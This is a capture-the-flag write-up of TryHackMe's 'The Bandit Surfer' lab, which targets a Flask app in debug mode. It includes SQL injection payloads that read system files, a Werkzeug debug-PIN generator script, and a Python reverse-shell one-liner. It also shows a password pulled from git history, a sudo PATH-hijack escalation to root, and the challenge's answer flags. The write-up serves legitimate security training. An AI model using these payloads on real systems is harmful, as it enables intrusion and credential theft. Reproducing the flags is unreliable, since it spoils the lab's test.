---
layout: post
author: nIIk
title: "THM Advent of Cyber '23 Side Quest 4 -- The Bandit Surfer"
date: 2023-12-28 00:04
keywords: "THM, TryHackMe, Advent of Cyber, christmas, 2023, SQLi, SQL, Injection, Flask, Git"
categories: [THM]
tags: [CTF, THM, SQLi, Flask, Git]
---
## Introduction

"The Bandit Surfer" is a free, **hard** THM challenge, part of the [Advent of Cyber '23 Side Quest](https://tryhackme.com/room/adventofcyber23sidequest) event. This Room is the third of four. During the AoC 23 event, the access to the room had to be gained via a key. The way to obtain the key is covered [here](/posts/thm_aoc_23_sq#third-side-quest-challenge-key). The challenge is based on a box hosting a Flask application running in Debug mode.

## Enumeration & Initial Access

Starting with a portscan, we can see that the server is hosting only SSH and a Flask Web server.

```shell
[niik@strixg634]─[~] sudo nmap -sSCV -A -O -T4 10.10.56.179
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-23 23:02 GMT  
Nmap scan report for 10.10.56.179  
Host is up (0.094s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT     STATE SERVICE  VERSION  
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 e8:43:37:a0:ac:a6:22:57:53:00:6d:75:51:db:bc:a9 (RSA)  
|   256 25:16:18:74:8c:06:55:16:7e:20:84:89:ae:90:9a:f6 (ECDSA)  
|_  256 fc:0b:0f:e2:c0:00:bb:89:a1:8f:de:71:9d:ad:d1:63 (ED25519)  
8000/tcp open  http-alt Werkzeug/3.0.0 Python/3.8.10  
|_http-server-header: Werkzeug/3.0.0 Python/3.8.10  
|_http-title: The BFG  
| fingerprint-strings:    
|   FourOhFourRequest:    
|     HTTP/1.1 404 NOT FOUND  
|     Server: Werkzeug/3.0.0 Python/3.8.10  
|     Date: Sat, 23 Dec 2023 23:02:43 GMT  
|     Content-Type: text/html; charset=utf-8  
|     Content-Length: 207  
|     Connection: close  
|     <!doctype html>  
|     <html lang=en>  
|     <title>404 Not Found</title>  
|     <h1>Not Found</h1>  
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling  
and try again.</p>  
|   GetRequest:    
|     HTTP/1.1 200 OK  
|     Server: Werkzeug/3.0.0 Python/3.8.10  
|     Date: Sat, 23 Dec 2023 23:02:38 GMT  
|     Content-Type: text/html; charset=utf-8  
|     Content-Length: 1752  
|     Connection: close  
|     <!DOCTYPE html>  
|     <html lang="en">  
|     <head>  
|     <meta charset="UTF-8">  
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
|     <title>The BFG</title>  
|     <style>  
|     Reset margins and paddings for the body and html elements */  
|     html, body {  
|     margin: 0;  
|     padding: 0;  
|     body {  
|     background-image: url('static/imgs/snow.gif');  
|     background-size: cover; /* Adjust the background size */  
|     background-position: center top; /* Center the background image vertically and horizontally */  
|     display: flex;  
|     flex-direction: column;  
|     justify-content: center;  
|_    align-items: center;  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerp  
rint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
SF-Port8000-TCP:V=7.94%I=7%D=12/23%Time=6587670E%P=x86_64-pc-linux-gnu%r(G  
SF:etRequest,787,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.0\x2  
SF:0Python/3\.8\.10\r\nDate:\x20Sat,\x2023\x20Dec\x202023\x2023:02:38\x20G  
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x  
SF:201752\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang  
SF:=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20  
SF:\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20  
SF:initial-scale=1\.0\">\n\x20\x20\x20\x20<title>The\x20BFG</title>\n\x20\  
SF:x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20/\*\x20Reset\x20mar  
SF:gins\x20and\x20paddings\x20for\x20the\x20body\x20and\x20html\x20element  
SF:s\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20html,\x20body\x20{\n\x20\x20\  
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\  
SF:x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20  
SF:\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\  
SF:x20\x20\x20\x20\x20\x20\x20\x20background-image:\x20url\('static/imgs/s  
SF:now\.gif'\);\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgroun  
SF:d-size:\x20cover;\x20/\*\x20Adjust\x20the\x20background\x20size\x20\*/\  
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-position:\x  
SF:20center\x20top;\x20/\*\x20Center\x20the\x20background\x20image\x20vert  
SF:ically\x20and\x20horizontally\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20\  
SF:x20\x20\x20\x20display:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\  
SF:x20\x20\x20flex-direction:\x20column;\n\x20\x20\x20\x20\x20\x20\x20\x20  
SF:\x20\x20\x20\x20justify-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x  
SF:20\x20\x20\x20\x20\x20align-items:\x20center;\n\x20\x20\x20\x20\x20\x20  
SF:\x20\x20\x20\x20\x20")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT  
SF:\x20FOUND\r\nServer:\x20Werkzeug/3\.0\.0\x20Python/3\.8\.10\r\nDate:\x2  
SF:0Sat,\x2023\x20Dec\x202023\x2023:02:43\x20GMT\r\nContent-Type:\x20text/  
SF:html;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20clos  
SF:e\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Fo  
SF:und</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x  
SF:20not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\  
SF:x20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try  
SF:\x20again\.</p>\n");  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.94%E=4%D=12/23%OT=22%CT=1%CU=44755%PV=Y%DS=2%DC=T%G=Y%TM=658767  
OS:73%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS  
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1  
OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN  
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A  
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R  
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F  
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%  
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD  
OS:=S)  
  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
TRACEROUTE (using port 21/tcp)  
HOP RTT       ADDRESS  
1   237.02 ms 10.8.0.1  
2   237.62 ms 10.10.56.179  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 112.41 seconds
```

A quick `dirb` scan shows that the `/console` and `/download` directories are accessible on the Flask server. The availability of the `/console`  directory indicates that the server is running in insecure debug mode. 

```shell
[niik@strixg634]─[~] dirb http://10.10.56.179:8000/
  
-----------------  
DIRB v2.22       
By The Dark Raver  
-----------------  
  
START_TIME: Sat Dec 23 22:59:00 2023  
URL_BASE: http://10.10.56.179:8000/  
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt  
  
-----------------  
  
GENERATED WORDS: 4612                                                             
  
---- Scanning URL: http://10.10.56.179:8000/ ----  
+ http://10.10.56.179:8000/console (CODE:200|SIZE:1563)                                                              
+ http://10.10.56.179:8000/download (CODE:200|SIZE:20)                                                               
                                                                                                                    
-----------------  
END_TIME: Sat Dec 23 23:04:10 2023  
DOWNLOADED: 4612 - FOUND: 2
```

However, the `/console` directory is PIN protected.

![PIN](blog/thm/aoc_23_room4/pin.png)

That being said, this PIN can be easily calculated as long as we find the following details:

- Username
- Application Path
- MAC
- Server ID

>Read more: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)
{: .prompt-tip }

After a quick look at the `/download` path, we can see that the Flask app is using SQL. "Luckily", the app is vulnerable to SQLi.

![SQLi](blog/thm/aoc_23_room4/sqli.png)

Armed with that, we can now enumerate the needed information in order to calculate the PIN.

Starting with the username and the aplication path, we can see that in the traceback console. The username can also be verified via a DB scan with SQLmap.

![Traceback](blog/thm/aoc_23_room4/traceback.png)

Moving on to the MAC address, we first need to identify the network adapter. To do so, we can use the following SQLi payload.

```
/download?id=0' UNION SELECT 'file://////proc/net/arp'; --
```

```
IP address       HW type     Flags       HW address            Mask     Device
10.10.0.1        0x1         0x2         02:c8:85:b5:5a:aa     *        eth0
```

Then we can run the following payload with the given device name:

```
/download?id=0' UNION SELECT 'file://////sys/class/net/eth0/address'; --
```

```
02:3d:12:ea:d8:a1
```

And finally, we need to conver the HEX to Decimal:

```
2461333641377
```

The final part is to obtain the machine ID, which can be done with the following payload.

```
/download?id= ' UNION SELECT 'file://////etc/machine-id'; --
```

```
aee6189caee449718070b58132f2e4ba
```

Now, we can specify all options and run the PIN generator.

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'mcskidy',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2461333641377',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
{: file='pin_exploit.py'}

```shell
[niik@strixg634]─[~] python pin_exploit.py
107-006-799
```

Now, we can use the console to open a reverse shell with the following payload:

```python
import os,pty,socket;s=socket.socket();s.connect(("10.10.95.69",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

>You can add an SSH key and get a better shell after the initial Python shell.
{: .prompt-tip }

>What is the user flag?
> - [x] THM{SQli_SsRF_2_WeRkZeuG_PiN_ExPloit}
{: .prompt-info }

## Privilege Escalation

At first glance, the `~/app/app.py` file contains a `MYSQL_PASSWORD` variable. That being said, the current value of the variable does not appear to be the password for `mcskidy`. However, the `~/app` directory is a Git repository, and after looking through the repository log, I found that the previous `MYSQL_PASSWORD` is the user's password.

```shell
git log --all -p app.py
```

![Git](blog/thm/aoc_23_room4/git.png)

```
mcskidy:F453TgvhALjZ
```

This then helped me to find out that the user can run the following command as root.

```shell
mcskidy@proddb:~/app$ sudo -l  
Matching Defaults entries for mcskidy on proddb:  
   env_reset, mail_badpass, secure_path=/home/mcskidy\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User mcskidy may run the following commands on proddb:  
   (root) /usr/bin/bash /opt/check.sh
```

Looking into `/opt/check.sh`, we can see that the file cannot be edited due to its privileges, and overall the script can't be exploited. However, the files load `/opt/.bashrc`, so possibly we can somehow exploit that.

```bash
#!/bin/bash  
. /opt/.bashrc  
cd /home/mcskidy/  
  
WEBSITE_URL="http://127.0.0.1:8000"  
  
response=$(/usr/bin/curl -s -o /dev/null -w "%{http_code}" $WEBSITE_URL)  
  
# Check the HTTP response code  
if [ "$response" == "200" ]; then  
 /usr/bin/echo "Website is running: $WEBSITE_URL"  
else  
 /usr/bin/echo "Website is not running: $WEBSITE_URL"  
fi
```

By comparing the default system `.bashrc` and `/opt/.bashrc`, we can see that the only difference is the line containing `enable -n [#]`.

```shell
mcskidy@proddb:~/app$ vimdiff /opt/.bashrc /etc/skel/.bashrc
```

![Bashrc](blog/thm/aoc_23_room4/bashrc.png)

In this case, as the line is not correct, the `#]` part of the line is seen as a comment and is being ignored. As `[` is a building CMD, it is being ignored from `enable -n`. Therefore, we should be able to create a file with filename `[` in the `/home/mcskidy` directory _(due to the next line of the script)_ and put our malicious code in there.

```shell
mcskidy@proddb:~$ echo /usr/bin/bash > [
mcskidy@proddb:~$ chmod +x [
mcskidy@proddb:~$ sudo /usr/bin/bash /opt/check.sh
root@proddb:/home/mcskidy# whoami
root
```

🎉 Hooray, it worked! 🎉

>What is the root flag?
> - [x] THM{BaNDiT_YeTi_Lik3s_PATH_HijacKing}
{: .prompt-info }

>What is the `yetikey4.txt` flag?
> - [x] 4-3f$FEBwD6AoqnyLjJ!!Hk4tc*V6w$UuK#evLWkBp
{: .prompt-info }

## Credits

This room was completed with joint efforts with the following teammates:

| | |
|-|-|
|[<img src="https://tryhackme-badges.s3.amazonaws.com/steentofte.png" alt="steentofte">](https://tryhackme.com/p/steentofte)|[<img src="https://tryhackme-badges.s3.amazonaws.com/Asborg.png" alt="Asborg">](https://tryhackme.com/p/Asborg)|
|[<img src="https://tryhackme-badges.s3.amazonaws.com/Ethreal.png" alt="Ethreal">](https://tryhackme.com/p/Ethreal)|[<img src="https://tryhackme-badges.s3.amazonaws.com/RohanHax.png" alt="RohanHax">](https://tryhackme.com/p/RohanHax)|